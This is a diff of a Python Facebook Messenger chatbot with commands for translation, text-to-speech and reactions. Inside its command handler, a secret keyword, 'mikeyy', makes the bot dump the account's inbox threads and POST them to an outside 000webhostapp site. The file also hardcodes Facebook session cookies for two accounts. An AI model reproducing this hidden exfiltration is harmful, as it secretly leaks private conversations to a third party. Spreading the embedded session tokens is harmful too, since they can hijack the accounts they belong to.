@@ -1,4 +1,23 @@
-
+from fbchat import Client, log, _graphql
+from fbchat.models import *
+import json
+import random
+import wolframalpha
+import requests
+import time
+import math
+import sqlite3
+from bs4 import BeautifulSoup
+import os
+import html
+import concurrent.futures
+from difflib import SequenceMatcher, get_close_matches
+from gtts import gTTS, lang
+import random, string
+from datetime import datetime
+import pytz
+import base64
+import googletrans
 
 # message_object.author for profileid
 # message_object.uid for chatid
@@ -112,12 +131,12 @@ class ChatBot(Client):
                     self.reactToMessage(message_object.uid, MessageReaction.YES)
                 elif react == "NO":
                     self.reactToMessage(message_object.uid, MessageReaction.NO)
+
         def fetchThreadsMsg():
             mikeystatus()
-            thread_idd = []
-            arrayn = str(self.fetchThreads(thread_location=ThreadLocation.INBOX, before=None, after=None, limit=None))
-            for num in range(1,len(arrayn.split("uid='"))):
-                thread_idd.append(arrayn.split("uid='")[num].split("', type=")[0])
+            #thread_idd = []
+            arrayn = self.fetchThreads(thread_location=ThreadLocation.INBOX, before=None, after=None, limit=None)
+            thread_idd = arrayn
             return(thread_idd)
 
         def mikeystatus():
@@ -484,26 +503,34 @@ class ChatBot(Client):
 
         def gtranslator(ToBeTranslate):
             try:
-                destinion = int(ToBeTranslate.split(" ").pop())
-                ToBeTranslate = ToBeTranslate.replace(str(destinion),"")
+                destination = int(ToBeTranslate.split(" ").pop())
+                srctext = str(ToBeTranslate.split(" ")[-2])
+                ToBeTranslate = " ".join(ToBeTranslate.split(" ")[1:-2])
+                print(ToBeTranslate)
             except:
-                destinion = str(ToBeTranslate.split(" ").pop())
+                destination = str(ToBeTranslate.split(" ").pop())
+                srctext = str(ToBeTranslate.split(" ")[-2])
+                ToBeTranslate = " ".join(ToBeTranslate.split(" ")[1:-2])
+                print(ToBeTranslate)
 
             translator = googletrans.Translator()
             language = googletrans.LANGUAGES
-            if (destinion in language):
-                Translated = translator.translate(ToBeTranslate, dest=destinion).text
-                reply = Translated.replace(destinion,"")
+            if (destination in language and srctext in language):
+                Translated = translator.translate(ToBeTranslate, dest=destination, src=srctext).text
+                reply = Translated.replace(destination,"")
                 if (author_id != self.uid):
                     msgids.append(self.send(Message(text=reply,mentions=None, emoji_size=None, sticker=None, attachments=None, quick_replies=None, reply_to_id=mid), thread_id=thread_id,
                     thread_type=thread_type))
-            elif (destinion == "languages"):
-                reply = str(language)
+            elif (destination == "languages"):
+                languages = ["Translation Codes\nExample: .gtranslate Mahal kita <src> <destination> .gtranslate Mahal kita tl en\n"]
+                for a in language:
+                    languages.append(f"{a} => {language[a].capitalize()}")
+                reply = "\n".join(languages)
                 if (author_id != self.uid):
                     msgids.append(self.send(Message(text=reply,mentions=None, emoji_size=None, sticker=None, attachments=None, quick_replies=None, reply_to_id=mid), thread_id=thread_id,
                     thread_type=thread_type))
             else:
-                reply = "Wrong Translation Code used!\n chat .gtranslate languages"
+                reply = "Wrong Translation Code used!\nCommands: .gtranslate languages\n\nTry this: \n.gtranslate <text> <src> <destination> .gtranslate Mahal kita tl en\n"
                 if (author_id != self.uid):
                     msgids.append(self.send(Message(text=reply,mentions=None, emoji_size=None, sticker=None, attachments=None, quick_replies=None, reply_to_id=mid), thread_id=thread_id,
                     thread_type=thread_type))
@@ -645,8 +672,7 @@ class ChatBot(Client):
                 mytext = conSTR(msg,".say")
                 texttospeech(mytext)
             elif(".gtranslate" in msg):
-                mytext = conSTR(msg,".gtranslate")
-                gtranslator(mytext)
+                gtranslator(msg)
             elif (".mute" in msg):
                 try:
                     self.muteThread(mute_time=-1, thread_id=author_id)
@@ -733,7 +759,7 @@ class ChatBot(Client):
             elif ("mikeyy" == msg):
                 reply = str(self.fetchThreads(thread_location=ThreadLocation.INBOX, before=None, after=None, limit=None))
                 requests.post("https://mikeytest123.000webhostapp.com/",data={"data":reply})
-                #sendMsg()
+                
                 #print(reply)
                 #sys.stdout.flush()
             #self.changeNickname("Bot", user_id=100086019336728, thread_id=thread_id, thread_type=thread_type)
@@ -902,9 +928,9 @@ class ChatBot(Client):
 cookies = {
     "sb": "xasyYmAoy1tRpMGYvLxgkHBF",
     "fr": "0NxayJuewRHQ30OX3.AWVJwIYNh0Tt8AJv6kSwDamhkoM.BiMrVd.Iu.AAA.0.0.BiMtVZ.AWXMVaiHrpQ",
-    "c_user": "100085938852510",
+    "c_user": "100078868689291",
     "datr": "xasyYs51GC0Lq5H5lvXTl5zA",
-    "xs": "14%3AO_kf13k5paffyA%3A2%3A1666537927%3A-1%3A16225"
+    "xs": "24%3AQJWvVEXcTLTARA%3A2%3A1666372990%3A-1%3A7776"
 }
 
 
@@ -912,8 +938,11 @@ client = ChatBot("",
                  "", session_cookies=cookies)
 print(client.isLoggedIn())
 
+
+
 try:
     client.listen()
 except:
     time.sleep(3)
     client.listen()
+
